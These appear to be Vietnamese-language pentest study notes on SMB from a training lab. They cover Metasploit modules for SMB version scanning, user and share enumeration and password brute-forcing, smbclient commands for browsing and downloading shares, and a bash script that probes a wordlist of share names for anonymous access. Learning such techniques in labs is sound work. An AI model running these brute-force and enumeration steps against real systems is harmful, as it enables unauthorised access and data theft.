# SMB

SMB (Server Message Block) là protocol chia sẻ tệp tin trong mạng nội bộ windows

Khi nói SMB trên Linux là đang nhắc đến SAMBA

port 445 (windows mới) hoặc 139 (windows cũ)

set IP mục tiêu cho tất cả module 

`setg RHOSTS ip` - g là global nên nó set toàn bộ RHOST mặc định là ip đó cho tất cả module 

`search type:auxiliary name:smb`

module `auxiliary/scanner/smb/smb_version`

module `auxiliary/scanner/smb/smb_enumusers` - để enum user

module `auxiliary/scanner/smb/smb_enumshares` - để tìm các chia sẻ  - `set ShowFiles true`

module `auxiliary/scanner/smb/smb_login` - brute force tài khoản  - `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`, `set SMBUser admin`

sau khi có password, thoát MSF

`smbclient -L \\\\IP\\ -U admin` (-L là list các chia sẻ)

nhập password

để xem chi tiết chia sẻ 

`smbclient \\\\IP\\<name_share> -U admin` - nhập pass

`ls`, `cd`, `get`...

ENUM share anonymous

```
#!/bin/bash

# Define the target and wordlist location
TARGET="target.ine.local"
WORDLIST="/root/Desktop/wordlists/shares.txt"

# Check if the wordlist file exists
if [ ! -f "$WORDLIST" ]; then
    echo "Wordlist not found: $WORDLIST"
    exit 1
fi

# Loop through each share in the wordlist
while read -r SHARE; do
    echo "Testing share: $SHARE"
    smbclient //$TARGET/$SHARE -N -c "ls" &>/dev/null

    if [ $? -eq 0 ]; then
        echo "[+] Anonymous access allowed for: $SHARE"
    else
        echo "[-] Access denied for: $SHARE"
    fi
done < "$WORDLIST"
```














